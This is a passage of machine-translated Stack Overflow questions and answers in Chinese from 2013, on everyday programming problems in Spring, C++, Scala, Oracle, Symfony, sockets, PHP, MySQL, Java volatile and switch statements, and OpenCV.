这是针对 APNS 的。我想向某个用户的所有设备发送通知。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T07:19:25.060

您必须将所有用户令牌存储在服务器上，并让用户从每台设备登录至少*1 次*，然后为该用户存储每个设备令牌并在后续应用程序运行时自动登录用户。

# spring - 如何为 MultiActionController 的 Delegate 方法设置默认方法？

> ID：14847140
> 
> 赞同：2
> 
> 时间：2013-02-13T05:43:22.723
> 
> 标签：spring, spring-mvc

我正在将 Spring MVC 用于 Web 应用程序项目，并且我试图避免使用注释。

我遇到了让 MultiActionController 和委托工作。

问题是，如何在 MultiActionController 的委托中设置默认方法？

MultiActionController，我的意思是这样的

```
public class TestController1 extends MultiActionController{

    public TestController1(){
        System.out.println("TestController1 initialising...");
    }
} 
```

我的xml设置是...

```
<bean id="multiactionController1" class="test.TestController1">
    <property name="delegate" ref="testDelegater1"/>    
    <property name="methodNameResolver" ref="paramResolver"/>
</bean>

<!-- Delegaters -->
<bean id="testDelegater1" class="test.TestController1Delegator"/>

<!-- param method name resolver -->
<bean id="paramResolver"  class="org.springframework.web.servlet.mvc.multiaction.ParameterMethodNameResolver">
    <property name="paramName" value="action"/>
</bean>
<!-- Simple Url Handler Mapping -->
    <bean class="org.springframework.web.servlet.handler.SimpleUrlHandlerMapping">
       <property name="mappings">
          <map>
             <entry key="/multiaction1/**" value-ref="multiactionController1"/>
             <entry key="/item/**" value-ref="itemController"/>
          </map>
       </property>
    </bean> 
```

因此，当我发送像 '*/item' 这样的请求时，请注意它没有操作参数，而不是给我一个错误，我希望有一个默认方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2017-09-30T05:47:19.197

使用 MethodNameResolver 的以下实现，它具有 defaultMethodName 属性。

`org.springframework.web.servlet.mvc.multiaction.ParameterMethodNameResolver`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T06:18:37.437

我可以按照此页面中的说明解决此问题。
[http://www.cwinters.com/blog/2004/02/18/spring_setting_a_default_action_for_multiactioncontroller.html](http://www.cwinters.com/blog/2004/02/18/spring_setting_a_default_action_for_multiactioncontroller.html)据我所知，如果没有指定方法名称
，您需要实现自己的返回默认方法名称。 我希望这有帮助 ： ）`MethodNameResolver`

# c++ - 在不实例化模板的情况下访问模板类的公共静态成员？

> ID：14847141
> 
> 赞同：3
> 
> 时间：2013-02-13T05:43:28.160
> 
> 标签：c++, template-meta-programming

我有一个模板化的类，想从它外部访问一个公共静态变量，但如果不实例化模板，我想不出任何方法。这段代码：

```
template<class T>
class TemplatedClass {
    public:
        static const int static_member = 10;
}; 
```

...

```
int i = TemplatedClass::static_member; 
```

产生以下错误：“'template class TemplatedClass' used without template parameters.”

如果我在访问变量时实例化类：

```
int i = TemplatedClass<int>::static_member; 
```

错误消失。我宁愿不必在使用虚拟类型参数并没有真正意义的上下文中实例化模板，只是为了抑制错误。如果必须，最好使用什么虚拟类型？我尝试了 <> 和 <void>，但都没有成功。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-13T05:46:23.960

无法完成，因为专业化可能会覆盖该值，即：

```
template<class T>
class TemplatedClass : public BaseClass
{
    static const int value = 42;
};

template<>
class TemplatedClass<StarTrek>
{
    static const int value = 47;
} 
```

因此，您将获得不同的值：

```
TemplatedClass<StarTrek>::value != TemplatedClass<void>::value 
```

如果值要相等，我强烈建议您添加一个非模板基类：

```
class BaseClass {
public:
    static const int value = 42;
};

template<class T>
class TemplatedClass : public BaseClass
{
    ...
} 
```

实例化或显式地实例化一个虚拟类型（即 void）可能会起作用，但根据您使用模板参数的方式，您可能会遇到编译错误。

```
int x = TemplatedClass<void>::value; 
```

因此，**请**编写清楚地表明您的意图的代码，即所有实例化的公共值不应该在依赖于类型的模板类中。如果您不能这样做，请更详细地解释您要执行的操作。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-13T05:54:23.150

使用虚拟类型可能适用于琐碎的类，但如果事情变得更复杂，则不会。

让我们想象一下，您的课程像这样“继续”：

```
template<class T>
class TemplatedClass {
public:
    static const int static_member = 10;
    typedef typename std::enable_if< std::is_integral< T >::value >::type type;
}; 
```

这段代码告诉我们 T**不能**是非整数类型。

Upd（感谢 jogojapan）：这就是为什么在某些情况下您不能将**任何**类型用作虚拟类型

# c# - 将 .NET 执行与 Mono（在 OSX 上）进行比较

> ID：14847142
> 
> 赞同：0
> 
> 时间：2013-02-13T05:43:35.257
> 
> 标签：c#, .net, mono, monomac

我在 .NET 中构建了一个应用程序并且效果很好。我目前正在为 OSX 制作 Mono 端口，但遇到了一个非常奇怪的错误。在我的代码的一个区域中，它似乎在 Mono 上输出与在 .NET 上完全不同的数据，但据我自己单步执行代码可以看出，所有一切都以相同的方式执行，尽管我很容易错过一些东西。我想要的是某种方式来执行这两个程序并保存“执行”，以便我可以在 Beyond Compare 中比较两者。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T12:09:28.290

据我所知，没有办法执行程序并在它们完成后比较执行。

我要做的是将Mac和PC放在一起，同时运行调试器。然后，您应该能够轻松地比较每个执行并找出它们开始不同的地方。

# scala - Scala：返回参数化类型的默认值

> ID：14847150
> 
> 赞同：2
> 
> 时间：2013-02-13T05:44:15.783
> 
> 标签：scala

考虑 Scala 中的以下函数：

```
def wrapMyFunction[A](foo: =>A):A = {
    try {
        foo
    }
    catch { case e => 
        //Return whatever the "empty" or "default" instance of type A would be,
        //such as 0, "", None, List(), etc.
    }
} 
```

给定类型参数 A，如何获取类型 A 的“空”或“默认”值？甚至可能吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-13T05:52:53.000

好吧，从技术上讲，这是不可能的，原因很简单，没有“默认”值这样的东西。

你给出的例子都是幺半群零，所以，使用 Scalaz，你可以这样写：

```
def wrapMyFunction[A : Zero](foo: =>A):A = {
  ...
  catch { case e: Exception => // do not catch all throwables!
    implicitly[Zero[A]].zero
  }
} 
```

另一种选择是实例化一个值。您可以为此使用 a`ClassManifest`或`ClassTag`(Scala 2.10.0)。例如：

```
def wrapMyFunction[A : scala.reflect.ClassTag](foo: => A): A = {
  ...
  catch { case e: Exception =>
    implicitly[scala.reflect.ClassTag[A]].runtimeClass.newInstance.asInstanceOf[A]
  }
} 
```

然而，这取决于无参数构造函数的存在。使用 a`ClassManifest`几乎相同。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T06:24:47.203

正如丹尼尔所说，如果没有对`A`. 如果显式或隐式地更改方法以采用默认值，该怎么办：

```
def wrapMyFunction[A](foo: =>A, fallback: =>A):A = ... 
```

或者

```
def wrapMyFunction[A](foo: =>A)(implicit fallback:A):A = ... 
```

# stored-procedures - Oracle Sql Developer 3.1 看不到存储过程

> ID：14847152
> 
> 赞同：1
> 
> 时间：2013-02-13T05:44:29.853
> 
> 标签：stored-procedures, oracle-sqldeveloper

您好我正在使用 Oracle SQL Developer 3.1.06 并连接到 11g EE。每当我在左窗格中的任何过程中单击编辑时，在右侧窗口中显示“创建或替换”.. 我看不到任何过程代码。我可以在 toad 的同一登录中看到该过程。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-20T12:50:47.660

您确定您登录的用户是对象的所有者吗？

您可以通过查看 ALL_OBJECTS 表来检查所有者：

```
 SELECT * FROM ALL_OBJECTS WHERE OBJECT_NAME LIKE '%MYOBJECT%' 
```

您登录的用户可能只有有限的查看权限，无法访问代码。如果您找到所有者，您可以在连接窗口中浏览其他用户并从相关用户中选择程序。然后，您应该能够看到所有内容。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-09-18T16:17:28.140

我有一个名为 LOW_PRIVS 的用户。

他们只有 RESOURCE 和 CONNECT。

我创建了一个程序。

我打开程序。

[![在此处输入图像描述](../Images/eb913646362f07ae9dbae54b89b219d3.png)](https://i.stack.imgur.com/1lbQC.png)

以下是我们运行以获取本地过程的源代码：

```
WITH src AS (
    SELECT ROWNUM,
           line,
           text,
           origin_con_id
      FROM sys.all_source
     WHERE type    = :type
       AND owner   = :owner
       AND name    = :name
)
SELECT text
  FROM src,
       (
           SELECT MAX(origin_con_id) max_orig
             FROM src
       )
 WHERE origin_con_id   = max_orig
 ORDER BY line 
```

我们正在访问属于 SYS 的 ALL_SOURCE 视图。这应该适用于任何人。

但测试和验证。

注意：我使用的是 18.2 版——比 3.1 版更新了很多年。为了获得最佳支持，请升级。

# php - Symfony 2 - 在 Amazon S3 上上传图像的最佳实践

> ID：14847154
> 
> 赞同：4
> 
> 时间：2013-02-13T05:44:46.253
> 
> 标签：php, upload, amazon-s3, symfony-2.1

我有一个表单，其中有一个`file`字段可以上传图像。我需要将此图像上传到 Amazon S3。一步一步地构建这个我开始将图像上传到本地磁盘上，它现在可以工作了。

上传发生在我的实体内部`Page`，因为建议在保存实体之前测试上传是否成功。我最终得到了这段代码

```
 /**
     * @ORM\Column(name="objectThumbnail", type="string", length=255, nullable=true)
     */
    protected $objectThumbnail;

    /**
     * This is not a column in the database but it's mapping a field from the form
     *
     * @Assert\File(maxSize="600000000")
     */
    public $file;

    ...

    /**
     * @ORM\PrePersist()
     * @ORM\PreUpdate()
     */
    public function preUpload()
    {
        if (null !== $this->file) {
            // generate a unique filename
            $this->objectThumbnail = $this->getGuid().'.'.$this->file->guessExtension();
        }
    }

    /**
     * @ORM\PostPersist()
     * @ORM\PostUpdate()
     */
    public function upload()
    {
        if (null === $this->file) {
            return;
        }

        // if there is an error when moving the file, an exception will
        // be automatically thrown by move(). This will properly prevent
        // the entity from being persisted to the database on error
        $this->file->move($this->getUploadRootDir(), $this->objectThumbnail);

        unset($this->file);
    }

    /**
     * @ORM\PostRemove()
     */
    public function removeUpload()
    {
        if ($file = $this->getAbsolutePath()) {
            unlink($file);
        }
    } 
```

这是完美的，它就像一个魅力。只是 Symfony（2.1.7）因为属性的公共范围而尖叫`file`，没什么大不了的。

现在我需要集成 S3 层。为此，我想我会使用`Gaufrette`and `StreamWrapper`。

现在我正在努力寻找最好的方法。如何访问`Filesystem`实体中的服务？这样做真的很干净吗？在 Entity 中处理 S3 上图像的上传对我来说感觉有点尴尬。

你会建议怎么做？

干杯，

马克西姆

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-15T22:55:11.393

在您的实体中使用服务不是一个好习惯。我建议在本例中创建一个执行验证、持久性和上传的表单处理程序

我写了一个适合你需要的例子

```
//...
//inside a creation controller action
//...
//create a new page entity
$page = new Page();

//get your page form class
$form = $this->createForm(new PageForm(), $page);

//call your form handler
$formHandler = new PageFormHandler(
        $form,
        $this->get('request'),
        $this->get('your.gaufrette.filesystem'),
        $this->get('your.page.manager')
);

//form is valid ?
if ($formHandler->process()) {         
    //flash message, redirection etc
} 
```

处理程序类

```
namespace YourCompagnyBundle\Form\Handler;

use YourCompagnyBundle\Entity\Page;
use Symfony\Component\Form\Form;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\File\UploadedFile;
use Gaufrette\Filesystem;

class PageFormHandler
{
    protected $form;
    protected $request;
    protected $pageManager;
    protected $filesystem;

    public function __construct(Form $form, Request $request, Filesystem $filesystem, $pageManager)
    {
        $this->form    = $form;
        $this->request = $request;
        $this->filesystem = $filesystem;
        $this->pageManager = $pageManager;
    }

    public function process()
    {
        if( $this->request->getMethod() == 'POST' )
        {
            $this->form->bind($this->request);

            if( $this->form->isValid() )
            {
               $this->onSuccess($this->form->getData());               

                return true;
            }
        }

        return false;
    }

    function onSuccess(Page $page)
    {
        //has uploaded file ?
        if($page->getFile() instanceof UploadedFile){
            //do some logic with gaufrette filesystem
           //if page is already managed in database (update), delete previous file

        }
        //storage
        $this->pageManager->save($page);
    }

} 
```

希望这有帮助

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-02-17T17:32:06.627

也许你应该检查一下[VichUploaderBundle](https://github.com/dustin10/VichUploaderBundle/blob/master/Resources/doc/index.md)，它基本上将 File 对象注入到你的实体中，并且与 Gaufrette 的集成非常容易。

# c++ - write() 套接字编程使程序无法前进

> ID：14847167
> 
> 赞同：0
> 
> 时间：2013-02-13T05:45:43.423
> 
> 标签：c++, sockets, client

嗨，我想我有一个简单的问题，但我无法弄清楚。这是我的代码片段

```
void makefilerequest(){
  int n;
  char buffer[256];
  char file[] = "test.txt";

  printf("Enter file: ");
  bzero(file, 256);
  //fgets(buffer, 255, stdin);
  n = write(sockfd, file, strlen(file));
  if( n < 0)
    error("ERROR writing to socket");

  bzero(buffer,256);
  n = read(sockfd,buffer,255);
  if (n < 0) 
    error("ERROR reading from socket");
  printf("%s\n",buffer);
} 
```

我的问题是当我尝试设置一个包含要写入套接字的信息的 char[] 时，我的程序不会向前移动它会停止在`n = write(sockfd, file, strlen(file));`. 但是，当我`test.txt`从标准输入中读取它时，它可以工作并且我的程序会执行。如果我进行以下更改，它可以工作，但我不想通过标准输入将信息传递给它。

```
void makefilerequest(){
  int n;
  char buffer[256];
  char file[] = "test.txt";

  printf("Enter file: ");
  bzero(buffer, 256);
  fgets(buffer, 255, stdin);
  n = write(sockfd, buffer, strlen(buffer));
  if( n < 0)
    error("ERROR writing to socket");

  bzero(buffer,256);
  n = read(sockfd,buffer,255);
  if (n < 0) 
    error("ERROR reading from socket");
  printf("%s\n",buffer);
} 
```

提前致谢

# android - 使用 Youtube 原生 App 的可点击视频

> ID：14847169
> 
> 赞同：1
> 
> 时间：2013-02-13T05:45:46.237
> 
> 标签：android, youtube

我使用此代码使用本机 youtube 应用程序播放 youtube 视频。

```
startActivity(new Intent(Intent.ACTION_VIEW,Uri.parse("vnd.youtube:zAhzo0JCbFY")).putExtra("force_fullscreen",true)); 
```

它工作正常。但事情是它的可点击视频是这样的：

```
http://www.youtube.com/watch?v=zAhzo0JCbFY 
```

Youtube 应用不允许点击链接。有什么事情要做吗（仅使用原生 youtube 应用程序）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T13:46:01.573

***对不起***

您唯一能做的就是等待 YouTube 应用实现这一点。

***但***

您可以找到一些替代方法，包括在 web 视图中显示视频（如果您管理的话）、本机显示链接（如果有的话），或者只使用浏览器。

在所有这些情况下，它都不是 Youtube 应用程序。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T09:30:12.110

您可以使用`<intent-filter>`. 我现在不知道确切的程序，但这[很好](https://stackoverflow.com/questions/2448213/how-to-implement-my-very-own-uri-schema-on-android/2448531#2448531)地解释了它。

# php - 代码在本地工作，但给出：期望参数是数组，在线运行时给出布尔值

> ID：14847179
> 
> 赞同：0
> 
> 时间：2013-02-13T05:46:28.830
> 
> 标签：php

我已经使用[这个](http://aterribleidea.com/3d10/3d10-simple-blackjack-dealer.txt)二十一点游戏中的一些代码来构建我自己的完整版本。

一切都使用 Xampp 在本地完美运行，但是当我上传完整版本时，我得到：期望参数是数组，给定布尔值。

我对 PHP 很陌生，但据我了解，我已经定义了数组。为什么它给我一个在线布尔值和离线数组？

这是我写的[完整游戏](http://torontothenaughty.ca/Toronto/Testing_Different_Things/Dice/BlackJackDealer.php) 。（网站有点 NSFWish，但页面很干净）

问题似乎来自这里：

```
function evaluateHand($hand) {
$Ace=0;
global $faces;
$value = 0;
foreach ($hand as $card) {
    if ($card['face'] == 'Ace') 
        $Ace++;

 $value = intval($value) + intval($faces[$card['face']]);

   while ($Ace>0 && $value >21)
        {
            $value = intval($value) - 10;
            $Ace--;
        }

} 
```

特别是 -foreach ($hand as $card) { 部分。

我确实记得读过其他人遇到同样的问题，并且解决方案似乎在这里从双引号切换到单引号。

```
<input type='hidden' name='handstr' value = '<?php echo $handstr ?>' /> 
```

但我已经有了单引号。

真正让我感到困惑的是，编写脚本的人似乎运行良好。

如果您将 .PHP 更改为 .txt，您可以看到完整的游戏代码（来自上面的链接……抱歉，最多 2 个链接）

任何人都知道为什么离线与在线不同，以及如何解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:40:38.013

您需要注意， 的输出`serialize()`不适合直接包含在 HTML 表单字段中；它可能包含 HTML 中不允许的字符，例如空字节、单引号和双引号等。

我建议您将输出包装`serialize()`在 Base64 中，例如：

```
<input type='hidden' name='dealerstr' value = '<?php echo base64_encode($dealerstr) ?>' /> 
```

当然，您也需要`base64_decode()`在反序列化之前 POST 数据。

# c++ - 读取 .part 文件并将它们全部连接起来

> ID：14847180
> 
> 赞同：0
> 
> 时间：2013-02-13T05:46:33.507
> 
> 标签：c++

所以我正在为一个学校项目编写我自己的自定义 FTP 客户端。我设法让所有东西都能与蜂拥而至的 FTP 客户端一起工作，并且只剩下最后一个小部分……将 .part 文件读入主文件。我需要做两件事。(1) 让它读取每个文件并正确写入最终文件 (2) 在我完成每个文件后删除部分文件的命令。

有人可以帮我修复我在下面写的连接函数吗？我认为我有权在 EOF 之前读取每个文件，然后继续阅读下一个文件。

在这种情况下`*numOfThreads`是 17。最终得到一个 4742442 字节的文件，而不是 594542592 字节。谢谢，我很乐意提供任何其他有用的信息。

编辑：修改代码以在下面发表评论。

```
 std::string s = "Fedora-15-x86_64-Live-Desktop.iso";
    std::ofstream out;
    out.open(s.c_str(), std::ios::out);
    for (int i = 0; i < 17; ++i)
    {
            std::ifstream in;
            std::ostringstream convert;
            convert << i;
            std::string t = s + ".part" + convert.str();
            in.open(t.c_str(), std::ios::in | std::ios::binary);
            int size = 32*1024;
            char *tempBuffer = new char[size];
            if (in.good())
            {
                    while (in.read(tempBuffer, size))
                            out.write(tempBuffer, in.gcount());
            }
            delete [] tempBuffer;
            in.close();
    }
    out.close();
    return 0; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T05:58:24.527

*复制循环中的*几乎所有内容都有问题。**

 *```
while (!in.eof()) 
```

这已破了。不多说了。

```
 bzero(tempBuffer, size); 
```

这是相当无害的，但完全没有意义。

```
 in.read(tempBuffer, size); 
```

这是“几乎”的部分——即没有明显损坏的部分。

```
 out.write(tempBuffer, strlen(tempBuffer)); 
```

您不想使用`strlen`它来确定长度——它仅适用于以 NUL 结尾的（C 样式）字符串。如果（显然是这种情况）您读取的数据可能包含零字节（而不是仅使用零字节来表示字符串的结束），这只会产生错误的大小。

您通常想要做的是一个循环，例如：

```
while (read(some_amount) == succeeded)
    write(amount that was read); 
```

在 C++ 中，这通常是这样的：

```
while (infile.read(buffer, buffer_size))
    outfile.write(buffer, infile.gcount()); 
```

可能还值得注意的是，由于您使用 为缓冲区分配内存`new`，但从不使用`delete`，您的函数正在泄漏内存。最好不要这样做`new`——数组或向量在这里是明显的替代品。

编辑：至于为什么`while (infile.read(...))`有效，`read`返回对流的引用。该流反过来提供到`bool`（在 C++11 中）或`void *`（在 C++03 中）的转换，可以解释为布尔值。该转换运算符返回流的状态，因此如果读取失败，它将被解释为`false`，但只要它成功，它将被解释为`true`。*

# mysql - MySql 查询在字段中包含一个字符串

> ID：14847181
> 
> 赞同：4
> 
> 时间：2013-02-13T05:46:34.953
> 
> 标签：mysql, sql

这个问题可能被问了好几次，我检查了所有的问题，但我无法得到答案。我的数据库'test'中有一个名为变量的字段。我已经完成了查询

```
select 'variables' from test WHERE variables LIKE '%{$ifIndex}%'; 
```

变量字段包含逗号分隔的字符串，`ifIndex, IfType, IfStatus` 但我无法得到它！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T05:48:10.307

尝试以下操作：

```
select variables from test WHERE 'ifIndex' LIKE CONCAT('%',`variables` , '%') ; 
```

如果您只想匹配开头：

```
select variables from test WHERE 'ifIndex' LIKE CONCAT(`variables` , '%') 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-13T05:50:50.500

当您将要查找的字符串仅使用 % 作为通配符放在任一侧时，这将获得您想要的结果。

```
select variables from test WHERE variables LIKE '%ifIndex%'; 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-02-13T05:51:13.277

试试下面的代码

```
select variables from test
WHERE variables LIKE '%{$ifIndex}%'; 
```

对于字段名称，不要放单引号。

# php - 在服务器中保存一个 javascript 字符串

> ID：14847184
> 
> 赞同：3
> 
> 时间：2013-02-13T05:47:05.983
> 
> 标签：php, javascript, ajax

我在服务器端有最高 5.4 的 PHP、Perl 5.8、C 和 Python。

所以基本上我有 JavaScript 客户端，我正在生成一个字符串。我想在服务器端保存这个字符串。

我知道如何使用`XMLHttpRequest`. ~~但我不喜欢使用文件来存储字符串，即使它很大。~~

所以我正在寻找的是一个从 Javascript 到 PHP（或对我可用的东西）并从 PHP 到 JavaScript 的字符串的示例。

如果它不涉及 MySQL，那就更好了（我只想保存一个字符串）。我对 jQUERY 一无所知，但我现在不打算研究它。

编辑1：为了精确我需要什么，用户将使用JS应用程序连接到网站，并在中间保存一些简单的东西（字符串）。我希望以后当他（或其他用户）回到网站时，他可以取回他的东西。

编辑 2：因为它不能像 nnnnnn 在评论中所说的那样完成。我将问题更改为：
我想在使用 JS 应用程序期间保存一个字符串并为下一个用户恢复它。

**编辑 3：我正在寻找一个将字符串保存在文件中的简单示例，因为没有其他解决方案是可行的。**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T06:37:22.160

如果我理解正确：

1.  发送所需的服务器并将其保存到某个临时位置（文件、数据库等）
2.  下次加载，通过ajax询问是否有任何更改或保存数据
3.  如果是这样，加载它们
4.  如果数据是 javascript sode，您可以使用 eval() 代码
5.  另一个非常肮脏的解决方案是使用 cookie 数据
6.  您不能期望旧浏览器也支持新浏览器中支持的功能 - 保存本地化是不可能的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T07:05:32.953

据我了解，您希望在用户之间共享数据。这样，您将信息发送到服务器，服务器负责稍后提供相同的数据。而且您不想使用文件和数据库。Session 不适合保存大数据。

然后，另一种解决方案是将您的数据存储在 Memcache 服务器中。这更适合您的情况。但是关于Memcache你要记住一件事，那就是Memcache不是持久化存储。但是您可以根据需要增加 Memcache 刷新间隔。

注意：Memcache 是一个消耗 RAM 的进程。

# java - 关于 volatile 变量的使用

> ID：14847187
> 
> 赞同：0
> 
> 时间：2013-02-13T05:47:30.330
> 
> 标签：java

我是 volatile 变量的新手，但我正在阅读文章，其中指出 2) 在某些情况下，Volatile 变量可以用作在 Java 中实现同步的另一种方法，比如 Visibility。使用 volatile 变量，它保证一旦写入操作完成，所有读取器线程都会看到 volatile 变量的更新值，如果没有 volatile 关键字，不同的读取器线程可能会看到不同的值。

我请求你们能不能给我展示一个小的java程序，所以从技术上讲，我也很清楚。

我的理解是......易失性意味着每个线程访问变量都将有自己的私有副本，与原始副本相同。但是如果线程要更改该私有副本，那么原始副本将不会得到反映。

```
public class Test1 {  
   volatile int i=0,j=0;  
   public void add1()  
           {  
            i++;  
            j++;  
      }  
   public void printing(){  
       System.out.println("i=="+i+ "j=="+j);  
   }  

    public static void main(String[] args) {  
        Test1 t1=new Test1();  
        Test1 t2=new Test1();  
        t1.add1();//for t1 ,i=1,j=1  
        t2.printing();//for t2 value of i and j is still,i=0,j=0  
        t1.printing();//prints the value of i and j for t1,i.e i=1,j=1  
        t2.add1();////for t2 value of i and j is changed to i=1;j=1  
        t2.printing();//prints the value of i and j for t2i=1;j=1  
    }  

} 
```

I request you guys could you please show a small program of volatile functionality, so technically also it is clear to me

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T05:52:52.840

您已阅读的易失性变量保证了可见性，但不保证原子性——线程安全的另一个重要方面。我将尝试通过一个例子来解释

```
public class Counter {
   private volatile int counter;

   public int increment() {
       System.out.println("Counter:"+counter); // reading always gives the correct value
       return counter++; // atomicity isn't guaranteed, this will eventually lead to skew/error in the expected value of counter.
   }

   public int decrement() {
       System.out.println("Counter:"+counter);
       return counter++;
   }
} 
```

在示例中，您可以看到读取操作将始终在瞬间给出正确的计数器值，但是原子操作（例如评估条件并执行某些操作以及基于读取值进行读取和写入）线程安全性是不保证。

您可以参考[此](https://stackoverflow.com/questions/7851327/illustrating-volatile-is-this-code-thread-safe)答案以获取更多详细信息。

> 易失性意味着每个线程访问该变量都有自己的私有副本，与原始副本相同。但是如果线程要更改该私有副本，则原始副本将不会得到反映。

我不确定我是否正确理解您，但 volatile 字段意味着它们是从所有线程可访问的主内存读取和写入的 - 变量没有线程特定的副本（缓存）。

来自[JLS](http://docs.oracle.com/javase/specs/jls/se7/html/jls-8.html#jls-8.3.1.4)，

> 一个字段可能被声明为 volatile，在这种情况下，Java 内存模型确保所有线程看到该变量的一致值

# java - 荒谬地使用 switch 语句

> ID：14847196
> 
> 赞同：0
> 
> 时间：2013-02-13T05:47:55.210
> 
> 标签：java, switch-statement

我正在和我的朋友一起做一些 Java 作业。讲师希望他编写一个 Java 程序，将整数输入转换为数字等级。100-90 = A 等等。唯一的问题是他必须使用 switch 语句。他还必须：

> 在你的 switch 语句中包含一个 case，如果用户输入任何小于 0 或大于 100 的数字，它将显示礼貌的错误消息。"

本来我也是这么想的...

```
import java.util.Scanner;
public class grade
{
    public static void main(String[] args)
    {
        int ng;//number grade
        String lg = "";//letter grade

        System.out.println("enter grade");

        Scanner in = new Scanner(System.in);

        ng = in.nextInt();

        switch (ng/10) 
        {
            case 10: 
            case 9:     
                lg = "A";  
                break;
            case 8:
                lg = "B";  
            break;
            case 7:     
                lg = "C";  
            break;
            case 6:     
                lg = "D";  
            break;
            default:     
                lg = "F";  
            break;
        }   
         System.out.println("You got an " + lg);
      }
} 
```

这并不完美，因为它允许超过 100 和低于 0 的值，但我试图避免输入 100-0 中的每个整数。这似乎是对 switch 语句的荒谬使用，我无法想象为什么大学教授会教它，除了说明**DRY**原则。

**有没有更好的方法仍然使用 switch 语句，但不会从 100-0 键入每个 int？**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T06:48:54.040

你总是可以在你的 switch 表达式中添加一些小的复杂性，以使案例更简单；这将计算`90-100 as 10`,`80-89 as 9`等等`101 and above will become 11 and above`, 和每个输入`below 0 will become 0 or negative`，因此它们将属于默认值；

```
switch ((ng-ng/100+10)/10)
{
    case 10:
        lg = "A";
        break;
    case 9:
        lg = "B";
        break;
    case 8:
        lg = "C";
        break;
    case 7:
        lg = "D";
        break;
    case 6: case 5: case 4: 
    case 3: case 2: case 1:
        lg = "F";
        break;
    default:
        System.out.println("Polite Error");
        lg = "";
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T05:53:14.693

是的，在地狱里，你绝对不想为此大声笑使用 switch 语句。但是你建议的方式是我能想到的最好的方式。

不过，我会为错误场景设置默认值，因为它可以是小于 0 或大于 100 的任何整数。在 0 到 100 之间，至少你有有限数量的情况（尽管你必须重复“F”案例多次）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T05:54:07.147

很好地使用整数除法；）

好吧，这段代码让我很尴尬，让我哭了。但在这里，只使用 switch 语句。

```
import java.util.Scanner;
public class grade
{
    public static void main(String[] args)
    {
        int ng;//number grade
        String lg = "";//letter grade
        boolean error = false;

        System.out.println("enter grade");

        Scanner in = new Scanner(System.in);

        ng = in.nextInt();

        switch (ng/10) 
        {
            case 10: 
                switch (ng)
                {
                     case 100:
                         lg = "A";
                         break;
                     default:
                         error = false;
                         break;
                }
                break;
            case 9:     
                lg = "A";  
                break;
            case 8:
                lg = "B";  
            break;
            case 7:     
                lg = "C";  
            break;
            case 6:     
                lg = "D";  
            break;
            case 5:     
            case 4:     
            case 3:     
            case 2:     
            case 1:     
            case 0:     
                lg = "F";  
                break;
            default:     
                error = true;
            break;
        }   

         if (error) {
           System.out.println("Sorry, the grade must be between 0 and 100");
         } else {
           System.out.println("You got an " + lg);
         }
      }
} 
```

布莱赫。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-13T05:51:17.203

怎么样：

```
String lg = null;
switch (ng/10) 
{
    case 10:
        if (ng > 100) {
            // polite error
            break;
        }
    case 9:
        lg = "A"
        break;
    case 8:
        lg = "B";  
        break;
    case 7:     
        lg = "C";  
        break;
    case 6:
        lg = "D";
        break;
    default:
         if (ng < 0) {
             // polite error
             break;
         }
         lg = "F";
         break;
} 
```

之后，`switch`您必须检查是否设置了成绩。

```
if (lg == null) {
    System.out.println("The input score was > 100 or < 0");
} else {
    System.out.println("You got an " + lg);
} 
```

# c++ - 对来自网络摄像头的图像进行阈值处理

> ID：14847197
> 
> 赞同：1
> 
> 时间：2013-02-13T05:47:59.217
> 
> 标签：c++, opencv

我正在为一个最终将涉及对象跟踪等的工作项目自学 OpenCV，而我现在只是想熟悉基础知识。我有一段代码旨在简单地从我的网络摄像头中抓取图像，将它们转换为灰度和阈值，然后将它们打印到窗口中。我不断收到此错误：

> “无法将参数 1 从 'cv::Mat' 转换为 'const CvArr *'”

使用此代码：

```
#include <opencv2/opencv.hpp>
#include <opencv2/highgui/highgui.hpp>

using namespace cv;

int main()
{
    Mat img;
    VideoCapture cap(0);

    while (true)
    {
        cap >> img;

        Mat tHold;
        cvtColor(img, tHold, CV_BGR2GRAY);
    cvThreshold(tHold, tHold, 50, 255, CV_THRESH_BINARY);

        imshow("Thresholded Image", tHold);
        waitKey(1);
    }

    return 0;
} 
```

问题是其他函数似乎可以工作，比如 Canny() 等......我只是无法让阈值工作。想法？谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T06:09:29.707

您正在使用`cvThreshold`OpenCV 的 C 接口中的函数。而输入图像的类型`cv::Mat`来自 C++ 接口。

对应的 C++ 函数`cvThreshold`是`cv::threshold`. 只需替换`cvThreshold`为`cv::threshold`.

# android - 用于布局的动态滚动视图，同时在 android 中可扩展文本

> ID：14847198
> 
> 赞同：0
> 
> 时间：2013-02-13T05:48:00.357
> 
> 标签：android

